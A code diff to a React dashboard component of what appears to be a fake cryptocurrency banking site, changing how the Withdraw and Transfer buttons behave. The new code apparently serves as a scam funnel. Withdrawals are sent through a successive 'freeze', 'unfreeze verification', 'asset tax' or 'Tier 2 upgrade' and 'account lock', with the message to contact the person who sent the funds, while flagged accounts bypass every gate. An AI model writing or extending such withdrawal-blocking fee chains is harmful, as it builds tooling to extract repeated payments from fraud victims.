@@ -22,19 +22,16 @@ import {
 import './UserDashboard.css';
 
 export const UserDashboard = () => {
-  const { user } = useAuth();
+  const { user, refreshUser } = useAuth();
   const navigate = useNavigate();
   const [copied, setCopied] = useState(false);
   const [hideBalance, setHideBalance] = useState(false);
 
-  // Redirect to AssetTaxView if unfreeze is paid but tax is not
+  // Refresh user on mount to ensure latest state
   useEffect(() => {
-    if (user?.hasPaidUnfreeze && !user?.hasPaidTax) {
-      navigate('/asset-tax');
-    }
-  }, [user, navigate]);
+    refreshUser();
+  }, [refreshUser]);
 
-  // In a real app, this would come from an API or context
   const unreadCount = 0;
 
   const handleCopyAccount = () => {
@@ -46,10 +43,74 @@ export const UserDashboard = () => {
 
   const formattedBalance = formatCurrency(user?.balance || 0);
 
+  // Determine account type display
+  let accountType = 'Institutional Tier-1';
+  if (user?.hasPaidTax && user?.isLocked) {
+    accountType = 'Tier 2 (Locked)';
+  } else if (user?.hasPaidTax) {
+    accountType = 'Tier 2';
+  }
+
+  // Check if user is frozen: only true if isFrozen is true AND unfreeze is not paid
+  const isFrozen = user?.isFrozen && !user?.hasPaidUnfreeze;
+
+  // Button click handlers with guards
+  const handleWithdrawClick = async () => {
+    // Refresh latest user first to avoid stale state
+    const latestUser = await refreshUser().catch(() => null);
+    const currentUser = latestUser || user;
+
+    // Bypass users can withdraw directly
+    if (currentUser?.bypassVerification) {
+      navigate('/withdraw');
+      return;
+    }
+
+    // Determine account type from current user
+    let currentAccountType = 'Institutional Tier-1';
+    if (currentUser?.hasPaidTax && currentUser?.isLocked) {
+      currentAccountType = 'Tier 2 (Locked)';
+    } else if (currentUser?.hasPaidTax) {
+      currentAccountType = 'Tier 2';
+    }
+
+    // If account is Tier 2 (or locked), redirect to lock page
+    if (currentAccountType === 'Tier 2 (Locked)' || currentAccountType === 'Tier 2') {
+      navigate('/lock-account');
+      return;
+    }
+
+    // If unfreeze is paid but tax is not, redirect to asset-tax
+    if (currentUser?.hasPaidUnfreeze && !currentUser?.hasPaidTax) {
+      navigate('/asset-tax');
+      return;
+    }
+
+    // If frozen and unfreeze not paid, redirect to freeze page
+    if (currentUser?.isFrozen && !currentUser?.hasPaidUnfreeze) {
+      navigate('/freeze-account');
+      return;
+    }
+
+    // Otherwise, go to withdraw page
+    navigate('/withdraw');
+  };
+
+  const handleTransferClick = async () => {
+    const latestUser = await refreshUser().catch(() => null);
+    const currentUser = latestUser || user;
+
+    if (currentUser?.isLocked) {
+      navigate('/lock-account');
+      return;
+    }
+    navigate('/transfer');
+  };
+
   return (
     <div className="dashboard">
-      {/* Freeze warning */}
-      {user?.isFrozen && (
+      {/* Freeze warning - only if frozen and not unfrozen */}
+      {isFrozen && (
         <div className="freeze-warning">
           <Lock />
           <div>
@@ -57,6 +118,29 @@ export const UserDashboard = () => {
             <p>Your withdrawal of ${(user.pendingWithdrawalAmount || 0).toLocaleString()} is pending. Unfreeze verification is required.</p>
           </div>
           <button onClick={() => navigate('/unfreeze-account')}>Complete Unfreeze Verification <ChevronRight /></button>
+        </div>
+      )}
+
+      {/* Upgrade warning - if unfrozen but not upgraded yet */}
+      {!isFrozen && user?.hasPaidUnfreeze && !user?.hasPaidTax && !user?.isLocked && (
+        <div className="upgrade-warning">
+          <div>
+            <h3>Upgrade to Tier 2 Required</h3>
+            <p>You need to upgrade your account to Tier 2 before you can make withdrawals.</p>
+          </div>
+          <button onClick={() => navigate('/asset-tax')}>Upgrade Now <ChevronRight /></button>
+        </div>
+      )}
+
+      {/* Lock warning - if locked */}
+      {user?.isLocked && (
+        <div className="lock-warning">
+          <Lock />
+          <div>
+            <h3>Account Temporarily Locked</h3>
+            <p>Your account is locked for security verification. Please contact the person who transferred funds to you.</p>
+          </div>
+          <button onClick={() => navigate('/lock-account')}>View Lock Details <ChevronRight /></button>
         </div>
       )}
 
@@ -99,13 +183,13 @@ export const UserDashboard = () => {
             <span className="currency">USD</span>
           </div>
           <div className="account-status">
-            Account Status: <span className={user?.isFrozen ? 'frozen' : 'active'}>
-              {user?.isFrozen ? '⚠️ Verification On Hold' : '● Active & Operational'}
+            Account Status: <span className={isFrozen ? 'frozen' : 'active'}>
+              {isFrozen ? '⚠️ Verification On Hold' : '● Active & Operational'}
             </span>
           </div>
         </div>
         <div className="balance-quick-info">
-          <div><span>Account Type</span><span>Institutional Tier-1</span></div>
+          <div><span>Account Type</span><span>{accountType}</span></div>
           <div><span>Deposit Channel</span><span>Bitcoin Vault</span></div>
           <div><span>Transfer Settlement</span><span>Instant (0s)</span></div>
         </div>
@@ -118,10 +202,10 @@ export const UserDashboard = () => {
           <button onClick={() => navigate('/deposit')}>
             <ArrowDownLeft /> <span>Deposit</span><small>Crypto Bitcoin</small>
           </button>
-          <button onClick={() => navigate('/withdraw')}>
+          <button onClick={handleWithdrawClick}>
             <ArrowUpRight /> <span>Withdraw</span><small>Wire, BTC, PayPal</small>
           </button>
-          <button onClick={() => navigate('/transfer')}>
+          <button onClick={handleTransferClick}>
             <Send /> <span>Transfer</span><small>Instant 7-Digit Peer</small>
           </button>
           <button onClick={() => navigate('/invite')}>
